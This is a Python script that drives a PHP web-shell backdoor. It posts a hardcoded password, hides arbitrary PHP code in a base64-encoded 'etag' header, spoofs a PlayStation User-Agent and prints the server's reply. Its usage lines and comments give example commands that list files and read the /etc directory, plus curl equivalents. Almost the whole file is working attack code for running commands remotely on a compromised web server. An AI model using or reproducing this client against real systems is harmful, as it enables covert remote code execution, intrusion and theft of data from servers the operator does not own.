#!/usr/bin/python3
import requests
import sys
import base64
session=requests.Session()


arguments=sys.argv
scriptname=(arguments[0].split('/'))[-1]
password="hackerone"

if (len(arguments) != 3):
	
	print(f'\tUsage : {scriptname} httpbackdoorlocation phpline;')
	print(f'\t      : {scriptname} http://localhost/tests/c0ntacts.php "system(\'ls -al\')"')
	print(f'\t      : {scriptname} http://localhost/tests/c0ntacts.php "print_r(scandir(\'/etc/\'))"')
else:
	backdoor=arguments[1]
	phpline=arguments[2]+';'
	data={"key":password}
	headers={"etag":base64.b64encode(phpline.encode()),"User-Agent":"Mozilla/5.0 (PlayStation 4 4.07) AppleWebKit/537.78 (KHTML, like Gecko)"}
	response=session.post(backdoor,data=data,headers=headers)
	content=response.text
	print(content)




# // password is hackerone
# //curl -X POST -d "key=nothing&command=nothing" http://localhost/tests/encbackdoor.php

# //curl -H "command:system('ls -al');" -X POST -d "key=hackerone" http://localhost/tests/encbackdoor.php